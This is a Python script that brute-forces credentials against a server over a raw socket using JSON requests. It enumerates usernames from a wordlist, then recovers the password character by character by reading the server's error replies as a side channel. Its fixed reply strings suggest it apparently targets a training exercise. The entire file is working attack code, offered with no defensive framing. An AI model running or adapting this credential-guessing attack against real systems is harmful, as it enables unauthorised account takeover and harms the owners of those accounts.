import socket
import sys
import itertools
import os
import json

# Get the command-line arguments
hostname = sys.argv[1]
port = int(sys.argv[2])

# Path to the passwords.txt and logins.txt files
password_file_path = os.path.join(os.path.expanduser('~'), 'Downloads', 'passwords.txt')
login_file_path = os.path.join(os.path.expanduser('~'), 'Downloads', 'logins.txt')


# Function to send a JSON request and get the response
def send_request(socket, login, password):
    request = json.dumps({"login": login, "password": password})
    socket.send(request.encode())
    response = socket.recv(1024).decode()
    return json.loads(response)


# Create a socket and connect to the server
with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    # Load logins from the login file
    with open(login_file_path, 'r') as login_file:
        logins = [login.strip() for login in login_file]

    found_login = None

    # Try all logins with any password
    for login in logins:
        response = send_request(client_socket, login, "password")

        if response["result"] == "Wrong login!":
            continue
        elif response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
            found_login = login
            break

    if found_login:
        found_password = ""

        # Now try to find the password character by character
        while True:
            for char in itertools.chain.from_iterable(itertools.product(*([chr(x) for x in range(32, 127)]))):
                response = send_request(client_socket, found_login, found_password + char)

                if response["result"] == "Connection success!":
                    found_password += char
                    break
                elif response["result"] == "Wrong password!":
                    continue
                elif response["result"] == "Exception happened during login":
                    found_password += char
                    break

            if response["result"] == "Connection success!":
                break

        # Print the final combination in JSON format
        result = json.dumps({"login": found_login, "password": found_password})
        print(result)